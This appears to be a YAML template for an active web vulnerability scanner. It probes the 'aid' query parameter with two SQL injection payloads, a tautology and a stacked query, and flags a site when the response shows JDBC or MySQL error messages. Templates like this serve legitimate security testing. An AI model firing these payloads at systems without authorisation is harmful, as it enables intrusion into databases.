id: sqli3-generic-04
name: 'SQLi generic prefix #3 in aid'
severity: high
type: active
tags:
  - sqli
  - injection
  - generic
description: 'Triggers generic error via aid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      aid:
        - '1'' OR ''1''=''1'' /*'
        - '1''; SELECT 1--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'JDBC'
          - 'Warning: mysql'
